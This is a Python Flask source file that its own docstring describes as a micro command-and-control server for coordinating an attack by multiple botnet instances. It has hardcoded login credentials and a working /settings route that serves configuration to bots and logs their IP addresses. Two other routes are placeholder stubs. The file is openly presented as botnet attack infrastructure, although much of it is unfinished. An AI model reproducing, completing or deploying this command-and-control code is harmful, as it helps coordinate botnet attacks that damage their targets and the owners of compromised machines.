from flask import Flask
from flask import request
from CCServer import CCServer 

import logging
from logging.handlers import RotatingFileHandler
from time import time

app = Flask(__name__)

"""
This is a simple implementation of a micro Command-and-Control Server using Flask. 
Its purpose is to provide a lightweight and simple interface to coordinate an attack carried
by multiple botnet instances, ideally deployed 'round-the-clock'

(please note that in this implementation the server handles just one request at a time - flask default)
"""

# parameters for CC instance
settingsPath = './data/settings.json'
credentialsD = {
    'auth_usr' : "fsociety",
    'auth_pwd' : "steelmountain"
}
# creating CC instance
CC = CCServer(settingsPath, credentialsD)

# debug level
debug = True

# ROUTING SERVER - settings retrieval 
@app.route('/settings', methods=['GET'])
def getSettings():
    # retrieving settings
    settings = CC.retrieveSettings()
    # logging 
    app.logger.warning("[{0}] => reached by {1} : configuration update required".format(round(time()), request.remote_addr))

    return settings # as a string

# ROUTING SERVER - update settings 
@app.route('/update', methods=['POST'])
def updateSettings():
    return "hello settings post"

# ROUTING SERVER - logs visualization (debug purposes)
@app.route('/logs', methods=['GET'])
def getLog():
    return "hello log"

if __name__ == "__main__": 
    # adding log handler provided by werkzeug lib
    handler = RotatingFileHandler('./data/ccserver.log', maxBytes=10000, backupCount=1)
    handler.setLevel(logging.INFO)
    app.logger.addHandler(handler)
    # running server
    app.run()